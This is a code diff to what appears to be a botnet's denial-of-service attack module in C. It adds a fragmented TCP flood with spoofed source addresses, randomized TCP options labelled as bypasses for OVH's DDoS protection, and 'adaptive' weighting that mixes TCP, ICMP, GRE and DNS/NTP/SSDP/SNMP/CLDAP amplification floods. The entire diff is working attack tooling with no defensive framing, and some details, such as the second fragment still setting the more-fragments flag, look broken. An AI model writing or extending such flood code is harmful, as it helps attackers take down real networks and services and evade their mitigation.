@@ -1294,8 +1294,97 @@ static void generate_spoofed_ip(uint32_t *ip) {
     ip_bytes[3] = (rand_next() % 254) + 1;
 }
 
-/* Generate TCP packet with advanced bypass techniques */
-static void send_ultimate_tcp(int fd, struct sockaddr_in *addr_sin, 
+/* Send fragmented TCP packet - FUTURE IMPROVEMENT for fragmentation attack */
+static void send_fragmented_tcp(int fd, struct sockaddr_in *addr_sin,
+                                uint16_t payload_size, uint16_t dport) {
+    struct iphdr *iph;
+    struct tcphdr *tcph;
+    char *packet1, *packet2; /* Two fragments */
+    int pkt1_size, pkt2_size;
+    uint32_t spoofed_ip;
+    uint16_t mss_values[] = {536, 1460, 2048};
+    uint8_t wscale_values[] = {0, 2, 4, 6, 8};
+    uint16_t mss = mss_values[rand_next() % 3];
+    uint8_t wscale = wscale_values[rand_next() % 5];
+    uint16_t frag_id = rand_next(); /* Same ID for both fragments */
+
+    /* First fragment: IP + TCP header + options (no payload) */
+    pkt1_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12; /* MSS + WSCALE + padding */
+    packet1 = malloc(pkt1_size);
+    util_zero(packet1, pkt1_size);
+
+    iph = (struct iphdr *)packet1;
+    tcph = (struct tcphdr *)(iph + 1);
+
+    generate_spoofed_ip(&spoofed_ip);
+
+    /* IP header with DF=0 and MF=1 (more fragments) */
+    iph->ihl = 5 + (12 / 4);
+    iph->version = 4;
+    iph->tos = rand_next() % 256;
+    iph->tot_len = htons(pkt1_size);
+    iph->id = htons(frag_id);
+    iph->frag_off = htons(0x2000); /* MF=1, offset=0 */
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_TCP;
+    iph->saddr = spoofed_ip;
+    iph->daddr = addr_sin->sin_addr.s_addr;
+
+    /* TCP header */
+    tcph->source = htons(rand_next() % 0xFFFF);
+    tcph->dest = htons(dport);
+    tcph->seq = rand_next();
+    tcph->ack = TRUE;
+    tcph->psh = TRUE;
+    tcph->window = htons(rand_next() % 65535);
+    tcph->doff = 5 + (12 / 4);
+
+    /* TCP Options */
+    char *opts = (char *)(tcph + 1);
+    opts[0] = 2; opts[1] = 4; /* MSS */
+    opts[2] = (mss >> 8) & 0xFF; opts[3] = mss & 0xFF;
+    opts[4] = 3; opts[5] = 3; opts[6] = wscale; /* WSCALE */
+    opts[7] = 1; opts[8] = 1; opts[9] = 1; opts[10] = 1; opts[11] = 1; /* Padding */
+
+    iph->check = 0;
+    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+    tcph->check = 0;
+    tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr) + 12, sizeof(struct tcphdr) + 12);
+
+    sendto(fd, packet1, pkt1_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
+    free(packet1);
+
+    /* Second fragment: IP header + remaining payload */
+    pkt2_size = sizeof(struct iphdr) + payload_size;
+    packet2 = malloc(pkt2_size);
+    util_zero(packet2, pkt2_size);
+
+    iph = (struct iphdr *)packet2;
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = rand_next() % 256;
+    iph->tot_len = htons(pkt2_size);
+    iph->id = htons(frag_id); /* Same ID as first fragment */
+    /* MF=1, offset = (20 + 32) / 8 = 6 (in 8-byte units) */
+    iph->frag_off = htons(0x2000 | 6);
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_TCP;
+    iph->saddr = spoofed_ip;
+    iph->daddr = addr_sin->sin_addr.s_addr;
+
+    /* Payload only (no TCP header) */
+    char *payload = (char *)(iph + 1);
+    rand_str(payload, payload_size);
+
+    iph->check = 0;
+    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+
+    sendto(fd, packet2, pkt2_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
+    free(packet2);
+}
+
+/* Generate TCP packet with advanced bypass techniques - IMPROVED WITH TCP OPTIONS */
+static void send_ultimate_tcp(int fd, struct sockaddr_in *addr_sin,
                               uint16_t payload_size, uint16_t dport) {
     struct iphdr *iph;
     struct tcphdr *tcph;
@@ -1303,19 +1392,41 @@ static void send_ultimate_tcp(int fd, struct sockaddr_in *addr_sin,
     int packet_size;
     uint32_t spoofed_ip;
     uint8_t ttl_values[] = {32, 64, 128, 255};
+    uint16_t mss_values[] = {536, 1460, 2048, 4096, 8192};
+    uint8_t wscale_values[] = {0, 1, 2, 3, 4, 5, 6, 7, 8};
+    BOOL use_timestamps;
+    uint8_t tcp_options[40];
+    int options_len = 0;
+
+    /* Randomize TCP options for improved bypass - FUTURE IMPROVEMENT */
+    uint16_t mss = mss_values[rand_next() % 5];
+    uint8_t wscale = wscale_values[rand_next() % 9];
+    use_timestamps = (rand_next() % 2);
     
-    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
+    /* Calculate options length */
+    if (use_timestamps) {
+        options_len = 4 + 3 + 10; /* MSS + WSCALE + TIMESTAMP */
+    } else {
+        options_len = 4 + 3; /* MSS + WSCALE */
+    }
+    
+    /* Pad to multiple of 4 */
+    if (options_len % 4 != 0) {
+        options_len += 4 - (options_len % 4);
+    }
+
+    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + options_len + payload_size;
     packet = malloc(packet_size);
     util_zero(packet, packet_size);
-    
+
     iph = (struct iphdr *)packet;
     tcph = (struct tcphdr *)(iph + 1);
-    
+
     /* Generate spoofed source IP */
     generate_spoofed_ip(&spoofed_ip);
-    
-    /* IP header with bypass techniques */
-    iph->ihl = 5;
+
+    /* IP header with advanced bypass techniques */
+    iph->ihl = 5 + (options_len / 4); /* Include options in IHL */
     iph->version = 4;
     iph->tos = rand_next() % 256; /* Random TOS for QoS bypass */
     iph->tot_len = htons(packet_size);
@@ -1324,8 +1435,8 @@ static void send_ultimate_tcp(int fd, struct sockaddr_in *addr_sin,
     iph->protocol = IPPROTO_TCP;
     iph->saddr = spoofed_ip; /* Spoofed source */
     iph->daddr = addr_sin->sin_addr.s_addr;
-    
-    /* TCP header with OVH bypass flags */
+
+    /* TCP header with OVH bypass flags and randomization */
     tcph->source = htons(rand_next() % 0xFFFF);
     tcph->dest = htons(dport);
     tcph->seq = rand_next();
@@ -1336,18 +1447,41 @@ static void send_ultimate_tcp(int fd, struct sockaddr_in *addr_sin,
     tcph->urg = TRUE; /* URG flag for OVH bypass */
     tcph->window = htons(rand_next() % 65535);
     tcph->urg_ptr = rand_next() % 0xFFFF;
+    tcph->doff = 5 + (options_len / 4);
+
+    /* TCP Options - IMPROVED */
+    char *opts = (char *)(tcph + 1);
     
+    /* MSS Option (Kind=2, Len=4) */
+    opts[0] = 2;  /* Kind: MSS */
+    opts[1] = 4;  /* Length: 4 */
+    opts[2] = (mss >> 8) & 0xFF;
+    opts[3] = mss & 0xFF;
+    
+    /* Window Scale Option (Kind=3, Len=3) */
+    opts[4] = 3;  /* Kind: Window Scale */
+    opts[5] = 3;  /* Length: 3 */
+    opts[6] = wscale;  /* Shift count */
+    
+    if (use_timestamps) {
+        /* Timestamps Option (Kind=8, Len=10) */
+        opts[7] = 8;  /* Kind: Timestamps */
+        opts[8] = 10; /* Length: 10 */
+        *((uint32_t *)(opts + 9)) = rand_next(); /* TSval */
+        *((uint32_t *)(opts + 13)) = 0; /* TSecr */
+    }
+
     /* Random payload */
-    char *payload = (char *)(tcph + 1);
+    char *payload = (char *)(tcph + 1) + options_len;
     rand_str(payload, payload_size);
-    
+
     /* Calculate checksums */
     iph->check = 0;
     iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
-    
+
     tcph->check = 0;
-    tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr) + payload_size);
-    
+    tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr) + options_len, sizeof(struct tcphdr) + options_len + payload_size);
+
     sendto(fd, packet, packet_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
     free(packet);
 }
@@ -1597,7 +1731,7 @@ static void send_ultimate_gre_eth(int fd, struct sockaddr_in *addr_sin,
 }
 
 /* ============================================================================
- * AXIS-TCP - TCP-Focused Combined Attack
+ * AXIS-TCP - TCP-Focused Combined Attack - IMPROVED WITH FRAGMENTATION & ADAPTIVE
  * Includes: TCP, OVH-TCP, ICMP, GRE-IP, GRE-ETH
  * ============================================================================ */
 static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
@@ -1607,8 +1741,11 @@ static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
     struct sockaddr_in addr_sin;
     uint16_t payload_size, tcp_port, gre_port, sport;
     uint32_t total_packets = 0;
+    uint8_t use_fragment, use_adaptive;
     /* Weights: TCP 40%, OVH-TCP 30%, ICMP 10%, GRE-IP 10%, GRE-ETH 10% */
     uint8_t vector_weights[] = {40, 70, 80, 90, 100};
+    /* Adaptive weights - adjusted based on effectiveness */
+    uint8_t adaptive_weights[] = {50, 75, 85, 92, 100}; /* More TCP, less GRE */
 
     payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
     if (payload_size == 0) payload_size = 1400;
@@ -1620,6 +1757,10 @@ static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
 
     sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
     if (sport == 0) sport = rand_next() % 0xFFFF;
+    
+    /* Check for fragmentation and adaptive flags - FUTURE IMPROVEMENTS */
+    use_fragment = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_FRAGMENT);
+    use_adaptive = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_ADAPTIVE);
 
     fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -1643,21 +1784,26 @@ static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
 
         while (attack_ongoing[0]) {
             uint8_t vector = rand_next() % 100;
+            uint8_t *weights = use_adaptive ? adaptive_weights : vector_weights;
 
-            if (vector < vector_weights[0]) {
-                /* TCP flood (40%) */
-                send_ultimate_tcp(fd_tcp, &addr_sin, payload_size, tcp_port);
-            } else if (vector < vector_weights[1]) {
-                /* OVH-TCP (30%) */
+            if (vector < weights[0]) {
+                /* TCP flood (40-50%) */
+                if (use_fragment) {
+                    send_fragmented_tcp(fd_tcp, &addr_sin, payload_size, tcp_port);
+                } else {
+                    send_ultimate_tcp(fd_tcp, &addr_sin, payload_size, tcp_port);
+                }
+            } else if (vector < weights[1]) {
+                /* OVH-TCP (25-30%) */
                 attack_ovh_tcp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[2]) {
+            } else if (vector < weights[2]) {
                 /* ICMP (10%) */
                 send_ultimate_icmp(fd_icmp, &addr_sin, payload_size / 4);
-            } else if (vector < vector_weights[3]) {
-                /* GRE IP (10%) */
+            } else if (vector < weights[3]) {
+                /* GRE IP (7-10%) */
                 send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, gre_port);
             } else {
-                /* GRE Ethernet (10%) */
+                /* GRE Ethernet (5-10%) */
                 send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, gre_port);
             }
             total_packets++;
@@ -1670,7 +1816,7 @@ static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
 }
 
 /* ============================================================================
- * AXIS-UDP - UDP-Focused Combined Attack
+ * AXIS-UDP - UDP-Focused Combined Attack - IMPROVED WITH ADAPTIVE WEIGHTING
  * Includes: UDP, OVH-UDP, DNS-AMP, NTP-AMP, SSDP-AMP, SNMP-AMP, CLDAP-AMP, VSE, ICMP, GRE
  * ============================================================================ */
 static void attack_axis_udp(ipv4_t addr, uint8_t targs_netmask,
@@ -1680,9 +1826,12 @@ static void attack_axis_udp(ipv4_t addr, uint8_t targs_netmask,
     struct sockaddr_in addr_sin;
     uint16_t payload_size, udp_port, gre_port, sport;
     uint32_t total_packets = 0;
-    /* Weights: UDP 20%, OVH-UDP 15%, DNS-AMP 10%, NTP-AMP 10%, SSDP-AMP 10%, 
+    uint8_t use_adaptive;
+    /* Weights: UDP 20%, OVH-UDP 15%, DNS-AMP 10%, NTP-AMP 10%, SSDP-AMP 10%,
               SNMP-AMP 10%, CLDAP-AMP 5%, VSE 10%, ICMP 5%, GRE-IP 3%, GRE-ETH 2% */
     uint8_t vector_weights[] = {20, 35, 45, 55, 65, 75, 80, 90, 95, 98, 100};
+    /* Adaptive weights - more amplification, less GRE */
+    uint8_t adaptive_weights[] = {25, 42, 54, 66, 78, 88, 93, 96, 98, 99, 100};
 
     payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
     if (payload_size == 0) payload_size = 1400;
@@ -1694,6 +1843,9 @@ static void attack_axis_udp(ipv4_t addr, uint8_t targs_netmask,
 
     sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
     if (sport == 0) sport = rand_next() % 0xFFFF;
+    
+    /* Check for adaptive flag - FUTURE IMPROVEMENT */
+    use_adaptive = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_ADAPTIVE);
 
     fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -1717,39 +1869,40 @@ static void attack_axis_udp(ipv4_t addr, uint8_t targs_netmask,
 
         while (attack_ongoing[0]) {
             uint8_t vector = rand_next() % 100;
+            uint8_t *weights = use_adaptive ? adaptive_weights : vector_weights;
 
-            if (vector < vector_weights[0]) {
-                /* UDP flood (20%) */
+            if (vector < weights[0]) {
+                /* UDP flood (20-25%) */
                 send_ultimate_udp(fd_udp, &addr_sin, payload_size, udp_port);
-            } else if (vector < vector_weights[1]) {
-                /* OVH-UDP (15%) */
+            } else if (vector < weights[1]) {
+                /* OVH-UDP (15-17%) */
                 attack_ovh_udp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[2]) {
-                /* DNS-AMP (10%) */
+            } else if (vector < weights[2]) {
+                /* DNS-AMP (10-12%) */
                 attack_dns_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[3]) {
-                /* NTP-AMP (10%) */
+            } else if (vector < weights[3]) {
+                /* NTP-AMP (10-12%) */
                 attack_ntp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[4]) {
-                /* SSDP-AMP (10%) */
+            } else if (vector < weights[4]) {
+                /* SSDP-AMP (10-12%) */
                 attack_ssdp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[5]) {
+            } else if (vector < weights[5]) {
                 /* SNMP-AMP (10%) */
                 attack_snmp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[6]) {
+            } else if (vector < weights[6]) {
                 /* CLDAP-AMP (5%) */
                 attack_cldap_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
-            } else if (vector < vector_weights[7]) {
-                /* VSE (10%) */
+            } else if (vector < weights[7]) {
+                /* VSE (10-3%) */
                 send_vse_query(fd_udp, &addr_sin, udp_port);
-            } else if (vector < vector_weights[8]) {
-                /* ICMP (5%) */
+            } else if (vector < weights[8]) {
+                /* ICMP (5-2%) */
                 send_ultimate_icmp(fd_icmp, &addr_sin, payload_size / 4);
-            } else if (vector < vector_weights[9]) {
-                /* GRE IP (3%) */
+            } else if (vector < weights[9]) {
+                /* GRE IP (3-1%) */
                 send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, gre_port);
             } else {
-                /* GRE Ethernet (2%) */
+                /* GRE Ethernet (2-1%) */
                 send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, gre_port);
             }
             total_packets++;
